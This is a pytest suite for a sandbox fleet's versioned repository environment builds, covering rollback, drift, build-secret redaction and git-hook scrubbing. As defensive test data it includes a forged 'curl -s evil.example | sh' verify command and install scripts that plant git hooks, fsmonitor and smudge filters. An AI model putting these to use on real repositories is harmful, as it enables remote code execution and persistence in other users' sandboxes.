"""--- envbuilds: versioned repo builds end to end on the fake provider (envbuilds.py): the first sandbox falls back
and schedules a build; the next starts from it with the install done; drift rebuilds in the background; a failed
build never replaces the active one; rollback pins; the supervisor and the agent's instructions; REST."""

from __future__ import annotations

import asyncio
import io
import json
import os
import shlex
import shutil
import signal
import subprocess
import tarfile
import tempfile
import types
from pathlib import Path
from types import SimpleNamespace

import httpx
import pytest

from hangar import envbuilds, repoenv
from hangar.envbuilds import KV_SEEN, LABEL, Seen
from hangar.envspec import EnvCatalog, EnvSpec
from hangar.fleet import Fleet
from hangar.models import Sandbox
from hangar.repopolicy import RepoPolicies, repo_key

from .conftest import ENVS, FakeProvider, scratch_root

GIT = ["git", "-c", "user.email=t@t", "-c", "user.name=t", "-c", "init.defaultBranch=main"]
CONFIG = """\
install: mkdir -p node_modules && echo installed >> node_modules/count
verify: echo verified
"""


class ImageFake(FakeProvider):
    """A fake whose built images hold what their context ADDs, so a sandbox created from a build has its checkout."""

    def __init__(self):
        super().__init__()
        self.contexts = []

    async def build_template(self, spec, ctx, tag, log=None):
        await super().build_template(spec, ctx, tag, log)
        if "workspace.tgz" in ctx.files:
            self.contexts.append(ctx)
            dest = self.root / f"img-{len(self.snaps)}"
            for d in ("home/agent/.hangar", "workspace", "tmp"):
                (dest / d).mkdir(parents=True, exist_ok=True)
            (dest / "home/agent/.hangar/env").touch()
            target = next(ln.split()[-1] for ln in ctx.dockerfile.splitlines() if ln.startswith("ADD "))
            with tarfile.open(fileobj=io.BytesIO(ctx.files["workspace.tgz"])) as tf:
                tf.extractall(dest / target.lstrip("/"), filter="tar")
            self.snaps[tag] = dest
        return tag


@pytest.fixture
def world():
    root = Path(tempfile.mkdtemp(prefix="eb-", dir=scratch_root()))
    remote, seed = root / "app.git", root / "seed"
    subprocess.run([*GIT, "init", "-q", "--bare", str(remote)], check=True)
    subprocess.run([*GIT, "init", "-q", str(seed)], check=True)
    (seed / ".hangar").mkdir()
    (seed / ".hangar/environment.yaml").write_text(CONFIG)
    (seed / ".gitignore").write_text("node_modules\n")
    (seed / "package-lock.json").write_text("{}\n")
    _commit(seed, "init")
    subprocess.run([*GIT, "-C", str(seed), "push", "-q", str(remote), "HEAD:refs/heads/main"], check=True)
    subprocess.run(["git", "--git-dir", str(remote), "symbolic-ref", "HEAD", "refs/heads/main"], check=True)
    envs = root / "envs"
    envs.mkdir()
    (envs / "appenv.yaml").write_text("name: appenv\nharnesses: [claude-code]\n")
    yield SimpleNamespace(root=root, remote=remote, seed=seed, envs=envs, url=f"file://{remote}")
    shutil.rmtree(root, ignore_errors=True)


def _commit(seed: Path, msg: str) -> None:
    subprocess.run([*GIT, "-C", str(seed), "add", "-A"], check=True)
    subprocess.run([*GIT, "-C", str(seed), "commit", "-qm", msg], check=True)


def push(w, path: str, content: str) -> str:
    (w.seed / path).parent.mkdir(parents=True, exist_ok=True)
    (w.seed / path).write_text(content)
    _commit(w.seed, f"change {path}")
    subprocess.run([*GIT, "-C", str(w.seed), "push", "-q", str(w.remote), "HEAD:refs/heads/main"], check=True)
    return subprocess.run(["git", "-C", str(w.seed), "rev-parse", "HEAD"], capture_output=True,
                          text=True).stdout.strip()


@pytest.fixture
async def fl(settings, store, broker, world):
    f = Fleet(settings, store, broker, EnvCatalog([ENVS, world.envs]))
    f.providers["docker"] = ImageFake()
    yield f
    for t in envbuilds.wait_for_tasks(f):
        t.cancel()
    for p in f.providers["docker"].root.glob("*/home/agent/.hangar/svc/state.json"):
        try:
            os.kill(json.loads(p.read_text())["pid"], signal.SIGTERM)
        except (ProcessLookupError, ValueError, KeyError):
            pass


async def drain(f: Fleet) -> None:
    for _ in range(50):
        tasks = envbuilds.wait_for_tasks(f)
        if not tasks:
            return
        await asyncio.gather(*tasks, return_exceptions=True)
    raise AssertionError("builds kept starting")


async def sh(f: Fleet, sb: Sandbox, cmd: str) -> str:
    res = await f.providers["docker"].exec(sb, cmd)
    assert res.exit_code == 0, res.stderr
    return res.stdout


async def test_first_sandbox_falls_back_and_the_next_starts_from_the_build(fl, world):
    eb = envbuilds.of(fl)
    sb1 = await fl.create("appenv", repo=world.url)
    info = sb1.info["env_build"]
    assert info["fallback"] is True and "no build yet" in info["reason"] and info["version"] is None
    md = await sh(fl, sb1, "cat /home/agent/.claude/CLAUDE.md")
    assert "runs the environment's base image" in md and "echo installed >> node_modules/count" in md
    assert (await sh(fl, sb1, "ls /home/agent/.claude/skills/hangar-environment")).strip() == "SKILL.md"
    await drain(fl)
    rkey = repo_key(world.url)
    b = eb.active("docker", "appenv", rkey)
    assert b is not None and b.state == "succeeded" and b.version == "v1" and b.reason == "first"
    assert b.base == fl._tag_for(fl.catalog.get("appenv"), "docker", ["claude-code"])[0]
    assert b.config["install"].startswith("mkdir -p node_modules")
    assert not fl.list(label=f"{LABEL}={b.id}")  # the build's sandbox is gone
    ctx = fl.providers["docker"].contexts[-1]
    assert ctx.dockerfile.splitlines()[1] == f"FROM {b.base}" and "RUN" not in ctx.dockerfile
    audit = [e.action for e in fl.store.audit_tail(50)]
    assert "envbuild.start" in audit and "envbuild.finish" in audit

    sb2 = await fl.create("appenv", repo=world.url, work_branch="hangar/x")
    assert sb2.image == b.image
    info = sb2.info["env_build"]
    assert info["version"] == "v1" and info["fallback"] is False and info["stale"] is False
    assert info["commit"] == b.commit
    assert (await sh(fl, sb2, "cat /workspace/app/node_modules/count")).splitlines() == ["installed"]
    assert (await sh(fl, sb2, "cd /workspace/app && git rev-parse --abbrev-ref HEAD")).strip() == "hangar/x"
    assert "build v1 of the repo" in await sh(fl, sb2, "cat /home/agent/.claude/CLAUDE.md")
    assert not envbuilds.wait_for_tasks(fl)  # nothing moved: no rebuild


async def test_a_builds_git_hooks_and_config_dont_carry_into_later_sandboxes(fl, world):
    """#99 review: the build's `.git` came from after `install` and every sandbox started from the build got it, so a
    hook `install` left (or a hooksPath, fsmonitor, filter or alias it configured) ran in all of them, starting with
    hangar's own checkout, and outlived the commit that put it there until a rebuild."""
    push(world, ".hangar/environment.yaml", "install: |\n"
         "  mkdir -p node_modules .githooks\n"
         "  printf '#!/bin/sh\\ntouch \"$HOME/hooked-$(basename $0)\"\\n' > .git/hooks/post-checkout\n"
         "  cp .git/hooks/post-checkout .githooks/post-checkout\n"
         "  chmod +x .git/hooks/post-checkout .githooks/post-checkout\n"
         "  git config core.hooksPath .githooks\n"
         "  git config core.fsmonitor .githooks/post-checkout\n"
         "  git config filter.x.smudge 'touch $HOME/smudged'\n"
         "  git config alias.st status\n"
         "  git config include.path ../../extra.cfg\n")
    eb = envbuilds.of(fl)
    await fl.create("appenv", repo=world.url)
    await drain(fl)
    b = eb.active("docker", "appenv", repo_key(world.url))
    assert b is not None and b.state == "succeeded", b and (b.error, b.log)
    sb = await fl.create("appenv", repo=world.url, work_branch="hangar/x")
    assert sb.info["env_build"]["fallback"] is False
    hooks = (await sh(fl, sb, "ls /workspace/app/.git/hooks")).split()
    assert hooks and all(h.endswith(".sample") for h in hooks), hooks
    cfg = await sh(fl, sb, "cd /workspace/app && git config --local --no-includes --name-only --list")
    assert "remote.origin.url" in cfg
    for key in ("core.hookspath", "core.fsmonitor", "filter.x.smudge", "alias.st", "include.path"):
        assert key not in cfg, cfg
    assert (await sh(fl, sb, "ls -a /home/agent")).split().count("hooked-post-checkout") == 0  # nothing ran
    assert (await sh(fl, sb, "cd /workspace/app && git rev-parse --abbrev-ref HEAD")).strip() == "hangar/x"


async def test_drift_rebuilds_in_the_background_and_the_checkout_is_current(fl, world):
    eb = envbuilds.of(fl)
    await fl.create("appenv", repo=world.url)
    await drain(fl)
    head = push(world, "package-lock.json", '{"lock": 2}\n')
    sb = await fl.create("appenv", repo=world.url)
    assert sb.info["env_build"]["version"] == "v1"
    assert sb.info["env_build"]["stale"] is True and "a rebuild is running" in sb.info["env_build"]["reason"]
    assert (await sh(fl, sb, "cd /workspace/app && git rev-parse HEAD")).strip() == head  # fetched past the build
    await drain(fl)
    b = eb.active("docker", "appenv", repo_key(world.url))
    assert b.version == "v2" and b.reason == "drift" and b.commit == head
    push(world, "README.md", "a code change, not a dependency change\n")
    await fl.create("appenv", repo=world.url)
    assert not envbuilds.wait_for_tasks(fl)


async def test_a_failed_build_never_replaces_the_active_one_and_isnt_retried(fl, world):
    eb = envbuilds.of(fl)
    rkey = repo_key(world.url)
    await fl.create("appenv", repo=world.url)
    await drain(fl)
    push(world, ".hangar/environment.yaml", "install: echo broken >&2; exit 7\n")
    await fl.create("appenv", repo=world.url)
    await drain(fl)
    failed = eb.history("docker", "appenv", rkey)[0]
    assert failed.state == "failed" and "install exited with 7" in failed.error and "broken" in failed.log
    assert eb.active("docker", "appenv", rkey).version == "v1"
    sb = await fl.create("appenv", repo=world.url)
    assert sb.info["env_build"]["version"] == "v1" and sb.info["env_build"]["stale"] is True
    assert not envbuilds.wait_for_tasks(fl)  # the same failing config isn't built again
    assert len(eb.history("docker", "appenv", rkey)) == 2


async def test_a_build_that_failed_before_reading_the_config_isnt_retried_by_every_sandbox(fl, world, monkeypatch):
    """Review: a build that fails before it reads the repo's config (no room in the fleet, a clone that fails) has no
    config digest to remember. Without a pause, each new sandbox of the repo started another doomed build: at 60
    sessions, a stream of build sandboxes and clones."""
    from hangar.fleet import FleetError

    eb = envbuilds.of(fl)
    rkey = repo_key(world.url)
    real = fl.create

    async def full(env, **kw):
        if LABEL in (kw.get("labels") or {}):
            raise FleetError("fleet is at max_sandboxes=60; destroy some first")
        return await real(env, **kw)
    monkeypatch.setattr(fl, "create", full)
    await fl.create("appenv", repo=world.url)
    await drain(fl)
    first = eb.history("docker", "appenv", rkey)[0]
    assert first.state == "failed" and first.key is None and "max_sandboxes" in first.error
    for _ in range(3):
        await fl.create("appenv", repo=world.url)
        assert not envbuilds.wait_for_tasks(fl)
    assert len(eb.history("docker", "appenv", rkey)) == 1
    eb._put(first.model_copy(update={"finished_at": first.finished_at - envbuilds.RETRY_AFTER - 1}))
    monkeypatch.setattr(fl, "create", real)
    await fl.create("appenv", repo=world.url)  # later, it tries again
    await drain(fl)
    assert eb.active("docker", "appenv", rkey).version == "v2"


async def test_no_build_yet_and_a_failed_first_build_fall_back_with_the_reason(fl, world):
    push(world, ".hangar/environment.yaml", "install: exit 3\n")
    await fl.create("appenv", repo=world.url)
    await drain(fl)
    sb = await fl.create("appenv", repo=world.url)
    assert sb.info["env_build"]["fallback"] and "the latest build (v1) failed" in sb.info["env_build"]["reason"]
    assert "base image" in await sh(fl, sb, "cat /home/agent/.claude/CLAUDE.md")


async def test_rollback_pins_until_unpinned(fl, world):
    eb = envbuilds.of(fl)
    rkey = repo_key(world.url)
    await fl.create("appenv", repo=world.url)
    await drain(fl)
    v1 = eb.active("docker", "appenv", rkey)
    push(world, "package-lock.json", "{}\n{}\n")
    await fl.create("appenv", repo=world.url)
    await drain(fl)
    assert eb.active("docker", "appenv", rkey).version == "v2"
    eb.activate(v1.id, "ui:admin")
    head = eb.head("docker", "appenv", rkey)
    assert head.active == v1.id and head.pinned and head.pinned_by == "ui:admin"
    assert any(e.action == "envbuild.rollback" and e.detail.get("build") == v1.id for e in fl.store.audit_tail(20))
    eb.schedule(world.url, "appenv", "docker", actor="ui:x")
    await drain(fl)
    latest = eb.history("docker", "appenv", rkey)[0]
    assert latest.state == "succeeded" and "not activated" in latest.error
    assert eb.head("docker", "appenv", rkey).active == v1.id
    sb = await fl.create("appenv", repo=world.url)
    assert sb.info["env_build"]["version"] == "v1"
    eb.unpin(world.url, "appenv", "docker", "ui:admin")
    assert eb.head("docker", "appenv", rkey).active == latest.id
    push(world, ".hangar/environment.yaml", "install: exit 1\n")
    await fl.create("appenv", repo=world.url)
    await drain(fl)
    with pytest.raises(envbuilds.EnvBuildError, match="only a successful build"):
        eb.activate(eb.history("docker", "appenv", rkey)[0].id, "ui:admin")


async def test_history_keeps_the_newest_and_the_active(fl, world, settings):
    settings.env_builds_keep = 2
    eb = envbuilds.of(fl)
    rkey = repo_key(world.url)
    for i in range(4):
        eb.schedule(world.url, "appenv", "docker", actor="ui:x")
        await drain(fl)
        if i == 0:
            eb.activate(eb.history("docker", "appenv", rkey)[0].id, "ui:admin")
    hist = eb.history("docker", "appenv", rkey)
    head = eb.head("docker", "appenv", rkey)
    assert len(head.ids) == 2 and head.active in head.ids and [b.version for b in hist] == ["v4", "v1"]


async def test_build_secrets_through_the_real_buildsecrets(fl, world, broker):
    """Integration (#93 + #98): an admin's mapping on the repo policy, resolved from the vault by #98's
    hangar.buildsecrets, reaches install only; its in-sandbox leak scan fails a build that leaves the value behind;
    an unmapped id fails the build naming the id."""
    from hangar.models import CredentialKind
    from hangar.repopolicy import RepoPolicy

    broker.put("npm-cred", "generic", CredentialKind.GENERIC, "s3cret-npm-value", env_var="NPM_TOKEN")
    push(world, ".hangar/environment.yaml", "install: echo $OTHER\nbuild_secrets: [OTHER]\n")
    eb = envbuilds.of(fl)
    b = eb.schedule(world.url, "appenv", "docker")
    await drain(fl)
    b = eb.get(b.id)
    assert b.state == "failed" and "OTHER" in b.error and "aren't mapped" in b.error, b.error
    RepoPolicies(fl.store).put(RepoPolicy(repo=repo_key(world.url), build_secrets={"NPM_TOKEN": "npm-cred"}))
    push(world, ".hangar/environment.yaml",
         "install: test ${#NPM_TOKEN} -eq 16 && echo token is $NPM_TOKEN\nbuild_secrets: [NPM_TOKEN]\n")
    b = eb.schedule(world.url, "appenv", "docker")
    await drain(fl)
    b = eb.get(b.id)
    assert b.state == "succeeded", b.error
    assert "s3cret" not in b.log and "token is ***" in b.log
    assert b"s3cret-npm-value" not in fl.providers["docker"].contexts[-1].files["workspace.tgz"]
    push(world, ".hangar/environment.yaml", "install: echo \"$NPM_TOKEN\" > .npmrc\nbuild_secrets: [NPM_TOKEN]\n")
    b = eb.schedule(world.url, "appenv", "docker")
    await drain(fl)
    b = eb.get(b.id)
    assert b.state == "failed" and "left build secret(s) in the checkout" in b.error, b.error
    assert ".npmrc" in b.error and "s3cret" not in b.error


def _use(monkeypatch, fake: types.ModuleType) -> None:
    """Stand the fake's functions in for hangar.buildsecrets' own (integration: the real module is here, and
    `from hangar import buildsecrets` finds it on the package, not in sys.modules)."""
    from hangar import buildsecrets

    for name in ("mapping", "resolve", "leak_scan"):
        monkeypatch.setattr(buildsecrets, name, getattr(fake, name))


def _fake_buildsecrets(scans: list) -> types.ModuleType:
    """hangar.buildsecrets' interface (the egress PR): mapping, resolve and leak_scan."""
    m = types.ModuleType("hangar.buildsecrets")
    m.mapping = lambda spec, policy: {"NPM_TOKEN": "npm-cred"}
    m.resolve = lambda broker, mapping, ids=None: {i: b"s3cret-npm-value" for i in (ids or mapping)}

    async def leak_scan(prov, sb, values, paths=None, **_):
        scans.append((dict(values), list(paths or [])))
        out = await prov.exec(sb, f"grep -rlF {shlex.quote(values['NPM_TOKEN'].decode())} {paths[0]} || true")
        return [f"{p}: NPM_TOKEN" for p in out.stdout.split()]
    m.leak_scan = leak_scan
    return m


async def test_build_secrets_reach_install_only_and_a_leak_fails_the_build(fl, world, monkeypatch):
    scans: list = []
    _use(monkeypatch, _fake_buildsecrets(scans))
    push(world, ".hangar/environment.yaml",
         "install: test ${#NPM_TOKEN} -eq 16 && echo token is $NPM_TOKEN\nbuild_secrets: [NPM_TOKEN]\n")
    eb = envbuilds.of(fl)
    b = eb.schedule(world.url, "appenv", "docker")
    await drain(fl)
    b = eb.get(b.id)
    assert b.state == "succeeded", b.error
    assert "s3cret" not in b.log and "token is ***" in b.log  # redacted from the record
    assert scans and scans[0][1] == ["/workspace/app"]
    ctx = fl.providers["docker"].contexts[-1]
    assert b"s3cret-npm-value" not in ctx.files["workspace.tgz"]  # nothing of it in the image
    sb = await fl.create("appenv", repo=world.url)
    assert "s3cret" not in (await sh(fl, sb, "env; cat /home/agent/.hangar/env; ls -a /tmp"))
    push(world, ".hangar/environment.yaml", "install: echo \"$NPM_TOKEN\" > .npmrc\nbuild_secrets: [NPM_TOKEN]\n")
    b = eb.schedule(world.url, "appenv", "docker")
    await drain(fl)
    b = eb.get(b.id)
    assert b.state == "failed" and "left build secret(s) in the checkout" in b.error and ".npmrc: NPM_TOKEN" in b.error


async def test_a_build_secret_in_the_captured_checkout_fails_the_build_whatever_the_sandbox_says(fl, world,
                                                                                                  monkeypatch):
    """Review: the in-sandbox scan runs where install's code ran (a `grep` function in ~/.bashrc, a process install
    left running that writes after the scan). Hangar also checks the archive it captured: what the image gets."""
    m = _fake_buildsecrets([])

    async def blind(prov, sb, values, paths=None, **_):
        return []
    m.leak_scan = blind
    _use(monkeypatch, m)
    push(world, ".hangar/environment.yaml", "install: mkdir -p dist && printf 'k=%s' \"$NPM_TOKEN\" > dist/cfg.bin\n"
                                            "build_secrets: [NPM_TOKEN]\n")
    eb = envbuilds.of(fl)
    b = eb.schedule(world.url, "appenv", "docker")
    await drain(fl)
    b = eb.get(b.id)
    assert b.state == "failed" and "app/dist/cfg.bin: NPM_TOKEN" in b.error, b.error
    assert "s3cret" not in b.error and "s3cret" not in b.log and b.image is None


def test_archive_leaks_reads_across_chunks_and_links():
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        data = b"x" * ((1 << 20) - 5) + b"s3cret-npm-value" + b"y" * 10
        info = tarfile.TarInfo("app/big.bin")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
        link = tarfile.TarInfo("app/link")
        link.type, link.linkname = tarfile.SYMTYPE, "/tmp/s3cret-npm-value"
        tf.addfile(link)
        clean = tarfile.TarInfo("app/ok.txt")
        clean.size = 2
        tf.addfile(clean, io.BytesIO(b"ok"))
        tf.addfile(tarfile.TarInfo("app/s3cret-npm-value.txt"), io.BytesIO(b""))
    hits = envbuilds.archive_leaks(buf.getvalue(), {"NPM_TOKEN": b"s3cret-npm-value", "SHORT": b"abc"})
    assert hits == ["app/big.bin: NPM_TOKEN", "app/link: NPM_TOKEN", "app/***.txt: NPM_TOKEN"]


async def test_an_invalid_config_is_reported_not_fatal(fl, world):
    push(world, ".hangar/environment.yaml", "install: x\nimage: evil:latest\n")
    sb = await fl.create("appenv", repo=world.url)
    assert sb.state.value == "running"
    assert any(f["step"] == "config" and "decided in hangar" in f["message"] for f in sb.info["setup_failures"])
    assert "env_build" not in sb.info or sb.info["env_build"]["fallback"]
    assert not envbuilds.wait_for_tasks(fl)


async def test_terminals_start_under_the_supervisor(fl, world):
    push(world, ".hangar/environment.yaml",
         "start: echo seeded > seeded.txt\nterminals: [{name: web, command: sleep 300}]\nports: [{port: 3000}]\n")
    sb = await fl.create("appenv", repo=world.url)
    assert not envbuilds.wait_for_tasks(fl)  # nothing to install, nothing to build
    assert {"name": "web", "kind": "terminal", "port": None, "check": None} in sb.info["services"]
    assert {"name": "port-3000", "kind": "port", "port": 3000, "check": None} in sb.info["services"]
    box = fl.providers["docker"].boxes[sb.provider_ref]

    def state() -> dict:
        p = box / "home/agent/.hangar/svc/state.json"
        return json.loads(p.read_text()) if p.exists() else {}
    for _ in range(100):
        if any(p["name"] == "web" and p["state"] == "running" for p in state().get("programs", [])):
            break
        await asyncio.sleep(0.1)
    else:
        raise AssertionError(state())
    md = await sh(fl, sb, "cat /home/agent/.claude/CLAUDE.md")
    assert "`web`: `sleep 300`" in md and "hangar-agent svc status" in md
    # integration (#93 + #94): the sandbox's own doctor reads this build's record and the supervisor's live state
    r = await fl.exec(sb.id, "hangar-agent env doctor --json")
    by = {c["name"]: c for c in json.loads(r.stdout)["checks"]}
    svc = by["services"]  # web runs under the supervisor; nothing listens on the declared port 3000
    assert svc["status"] == "fail" and "unhealthy: port-3000" in svc["message"], svc
    assert [x["name"] for x in svc["data"]["healthy"]] == ["web"], svc


async def test_builds_off_change_nothing(fl, world, settings):
    settings.env_builds = False
    sb = await fl.create("appenv", repo=world.url)
    assert "env_build" not in sb.info and not envbuilds.wait_for_tasks(fl)
    assert "hangar:environment" not in (await sh(fl, sb, "cat /home/agent/.claude/CLAUDE.md 2>/dev/null || true"))


async def test_a_build_image_that_is_gone_falls_back(fl, world):
    await fl.create("appenv", repo=world.url)
    await drain(fl)
    b = envbuilds.of(fl).active("docker", "appenv", repo_key(world.url))
    fl.providers["docker"].images.discard(b.image)
    sb = await fl.create("appenv", repo=world.url)
    assert sb.image != b.image and sb.info["env_build"]["fallback"] and "is gone" in sb.info["env_build"]["reason"]


async def test_restart_interrupts_running_builds(fl, world):
    eb = envbuilds.of(fl)
    b = envbuilds.Build(repo="r", repo_url="u", environment="appenv", provider="docker", state="running")
    eb._put(b)
    assert eb.recover() == 1 and eb.get(b.id).state == "interrupted"


def test_provider_spec_gives_kubernetes_a_template_per_build():
    spec = EnvSpec(name="appenv", warm_pool=3)
    sb = Sandbox(name="s", environment="appenv", provider="kubernetes",
                 info={"env_build": {"id": "bld-0a1b2c3d", "image": "r/appenv-repo:x", "fallback": False}})
    out = envbuilds.EnvBuilds.provider_spec(spec, sb)
    assert out.name == "appenv-0a1b2c3d" and out.warm_pool == 0 and spec.name == "appenv"
    sb.info["env_build"]["fallback"] = True
    assert envbuilds.EnvBuilds.provider_spec(spec, sb) is spec


def test_checkout_script_quotes_and_defaults_to_the_remote_head():
    sb = Sandbox(name="s", environment="e", provider="docker", repo="https://x/a b.git", branch="feat/'x'")
    s = envbuilds.EnvBuilds.checkout_script(sb, "/workspace/a b")
    assert "cd '/workspace/a b'" in s and "'https://x/a b.git'" in s and "-B 'feat/'\"'\"'x'\"'\"''" in s
    sb.branch = None
    s = envbuilds.EnvBuilds.checkout_script(sb, "/w")
    assert "refs/remotes/origin/HEAD" in s
    # --- durable: no hook runs in hangar's own git commands there (a build from before kept its hooks)
    assert s.count("git -c core.hooksPath=/dev/null -c core.fsmonitor=false") == s.count("git ") == 5


def _scrubbed(tmp_path: Path, setup: list[list[str]]) -> tuple[dict[str, str], dict[str, str]]:
    """A repo configured by `setup` (git config arguments), scrubbed; its config and config.worktree after."""
    env = {**os.environ, "HOME": str(tmp_path), "GIT_CONFIG_NOSYSTEM": "1"}
    repo = tmp_path / "r"
    subprocess.run(["git", "init", "-q", str(repo)], check=True, env=env)
    for args in setup:
        subprocess.run(["git", "-C", str(repo), "config", *args], check=True, env=env)
    subprocess.run(["bash", "-c", envbuilds.GIT_SCRUB.format(path=shlex.quote(str(repo)))], check=True, env=env)

    def read(name: str) -> dict[str, str]:
        f = repo / ".git" / name
        if not f.exists():
            return {}
        out = subprocess.run(["git", "config", "--file", str(f), "--list"], capture_output=True, text=True, env=env)
        return dict(line.split("=", 1) for line in out.stdout.splitlines())

    return read("config"), read("config.worktree")


def test_the_git_scrub_keeps_lfs_and_sparse_checkout(tmp_path):
    """--- review: `git lfs install --local` (in `install`) puts LFS's filters in the repo's config, and sparse
    checkouts keep theirs in config.worktree. Scrubbed, every LFS file showed as modified and `git add` staged the
    real file instead of its pointer, so an agent's commit pushed the binaries past LFS."""
    cfg, wt = _scrubbed(tmp_path, [
        ["filter.lfs.clean", "git-lfs clean -- %f"], ["filter.lfs.smudge", "git-lfs smudge -- %f"],
        ["filter.lfs.process", "git-lfs filter-process"], ["filter.lfs.required", "true"],
        ["lfs.repositoryformatversion", "0"], ["extensions.worktreeConfig", "true"],
        ["--worktree", "core.sparseCheckout", "true"], ["--worktree", "core.sparseCheckoutCone", "true"]])
    assert cfg["filter.lfs.process"] == "git-lfs filter-process" and cfg["filter.lfs.clean"] == "git-lfs clean -- %f"
    assert cfg["filter.lfs.smudge"] == "git-lfs smudge -- %f" and cfg["filter.lfs.required"] == "true"
    assert wt == {"core.sparsecheckout": "true", "core.sparsecheckoutcone": "true"}


def test_the_git_scrub_covers_config_worktree_and_lfs_filters_that_run_something_else(tmp_path):
    """--- review: `extensions.worktreeConfig` (kept) makes git read .git/config.worktree, which the scrub didn't
    touch: a hooksPath `install` put there ran in every sandbox. An LFS filter is kept only as git-lfs's own."""
    cfg, wt = _scrubbed(tmp_path, [
        ["extensions.worktreeConfig", "true"], ["--worktree", "core.hooksPath", ".githooks"],
        ["--worktree", "core.fsmonitor", "touch /tmp/x"], ["filter.lfs.process", "sh -c 'touch /tmp/x'"],
        ["filter.lfs.smudge", "git-lfs smudge -- %f"], ["--add", "filter.lfs.smudge", "touch /tmp/x"]])
    assert wt == {} and "filter.lfs.process" not in cfg and "filter.lfs.smudge" not in cfg, (cfg, wt)


# ---------------------------------------------------------------------- jobs, MCP, REST
def _seen(fl, env: str, url: str, text: str, at: float) -> None:
    fl.store.kv_set(f"{KV_SEEN}{env}:{repo_key(url)}", Seen(
        config=repoenv.parse(text).model_dump(mode="json"), at=at).model_dump_json())


def test_job_defaults_take_extends_from_the_repo_file_when_allowed(fl, world):
    (world.envs / "other.yaml").write_text("name: other\n")
    fl.catalog.reload()
    _seen(fl, "appenv", world.url, "extends: other\nverify: make check\n", 1)
    cfg, env = envbuilds.job_defaults(fl, world.url, ["appenv", "other"])
    assert env == "other" and cfg.verify == "make check"
    assert envbuilds.job_defaults(fl, world.url, ["appenv"])[1] is None  # the allowlist says no
    fl.settings.env_builds = False
    assert envbuilds.job_defaults(fl, world.url, ["appenv", "other"]) == (None, None)


def test_a_repo_without_an_allowlist_doesnt_pick_its_environment(fl, world):
    """Review: the file is the repo's to write, and an environment carries credentials, secrets and egress. Only
    HANGAR_GITHUB_REPOS (an admin) says which environments a repo may name; with no entry its `extends` is ignored."""
    (world.envs / "other.yaml").write_text("name: other\n")
    fl.catalog.reload()
    _seen(fl, "appenv", world.url, "extends: other\nverify: make check\n", 1)
    assert envbuilds.job_defaults(fl, world.url, [])[1] is None
    cfg, env = envbuilds.job_defaults(fl, world.url, [], "appenv")  # the job named its environment
    assert env is None and cfg.verify == "make check"


def test_a_config_seen_in_another_environment_never_reaches_a_job(fl, world):
    """Review: what a sandbox recorded about the repo is only as good as its environment: its `setup` and `install`
    run before the read, and members make environments. A member's environment must not set the `verify` (a command
    run in other people's job sandboxes, with their credentials) or the `extends` of jobs in another environment."""
    (world.envs / "mine.yaml").write_text("name: mine\n")
    fl.catalog.reload()
    _seen(fl, "appenv", world.url, "verify: make check\n", 1)
    _seen(fl, "mine", world.url, "extends: mine\nverify: curl -s evil.example | sh\n", 2)  # newer, and forged
    cfg, env = envbuilds.job_defaults(fl, world.url, ["appenv"])
    assert env is None and cfg.verify == "make check"
    cfg, env = envbuilds.job_defaults(fl, world.url, [], "appenv")
    assert env is None and cfg.verify == "make check"
    assert envbuilds.job_config(fl, world.url, "appenv", None).verify == "make check"
    assert envbuilds.job_config(fl, world.url, "other", None) is None


def test_get_sandbox_shows_the_build():
    from hangar.mcp_server import _sb

    sb = Sandbox(name="s", environment="e", provider="docker", info={"env_build": {"version": "v3"}})
    assert _sb(sb)["env_build"] == {"version": "v3"}


@pytest.fixture
def api(fl, world):
    from fastapi import Depends, FastAPI, HTTPException

    who = {"admin": True}

    def admin() -> str:
        if not who["admin"]:
            raise HTTPException(403, "admin only")
        return "ui:admin"

    app = FastAPI()
    jobs = SimpleNamespace(fleet=fl, repo_envs=lambda r: ["appenv"], policies=RepoPolicies(fl.store))
    envbuilds.mount(app, SimpleNamespace(fleet=fl, jobs=jobs), Depends(admin), Depends(lambda: "ui:member"))
    client = httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://h")
    return SimpleNamespace(client=client, who=who)


async def test_rest_build_list_show_rollback(fl, world, api):
    c = api.client
    r = await c.post("/api/envbuilds", json={"repo": world.url})
    assert r.status_code == 200 and r.json()["environment"] == "appenv" and r.json()["version"] == "v1"
    await drain(fl)
    r = await c.get("/api/envbuilds", params={"repo": world.url})
    hist = r.json()
    assert hist["active"] == hist["builds"][0]["id"] and hist["builds"][0]["log"] is None
    one = (await c.get(f"/api/envbuilds/{hist['active']}")).json()
    assert one["state"] == "succeeded" and one["active"] and "installed" not in one["log"]  # it's ignored output
    assert (await c.get("/api/envbuilds")).json()[0]["active"]["version"] == "v1"
    assert (await c.get("/api/envbuilds/bld-nope")).status_code == 404
    api.who["admin"] = False
    assert (await c.post(f"/api/envbuilds/{hist['active']}/rollback")).status_code == 403
    assert (await c.post("/api/envbuilds/unpin", json={"repo": world.url})).status_code == 403
    api.who["admin"] = True
    r = await c.post(f"/api/envbuilds/{hist['active']}/rollback")
    assert r.status_code == 200 and r.json()["pinned"]
    assert (await c.post("/api/envbuilds/unpin", json={"repo": world.url})).json()["pinned"] is False
    assert (await c.post("/api/envbuilds", json={})).status_code == 400


async def test_rest_validate(fl, world, api):
    r = await api.client.post("/api/envbuilds/validate", json={"content": "extends: appenv\ninstall: x\n",
                                                                "repo": world.url})
    assert r.json()["valid"], r.json()
    r = await api.client.post("/api/envbuilds/validate", json={"content": "runtime_class: ''\n"})
    assert not r.json()["valid"] and "decided in hangar" in r.json()["errors"][0]


async def test_services_from_the_repo_start_with_the_next_sandbox(fl, world):
    push(world, ".hangar/environment.yaml",
         "services: {redis: {image: 'redis:7', port: 6379}}\nterminals: [{name: web, command: sleep 300}]\n")
    first = await fl.create("appenv", repo=world.url)  # nobody had seen the file before this clone
    assert "service_specs" not in first.info
    assert any("services start with the next sandbox" in f["message"] for f in first.info["setup_failures"])
    second = await fl.create("appenv", repo=world.url)
    assert set(second.info["service_specs"]) == {"redis"}
    assert {"name": "redis", "kind": "service", "host": "redis", "port": 6379, "check": None,
            "image": "redis:7"} in second.info["services"]
    assert not second.info.get("setup_failures")
    box = fl.providers["docker"].boxes[second.provider_ref]
    manifest = json.loads((box / "home/agent/.hangar/svc/manifest.json").read_text())
    assert manifest["services"] == [{"name": "redis", "host": "redis", "port": 6379, "ready": None}]
    assert "`redis` at `redis:6379`" in await sh(fl, second, "cat /home/agent/.claude/CLAUDE.md")


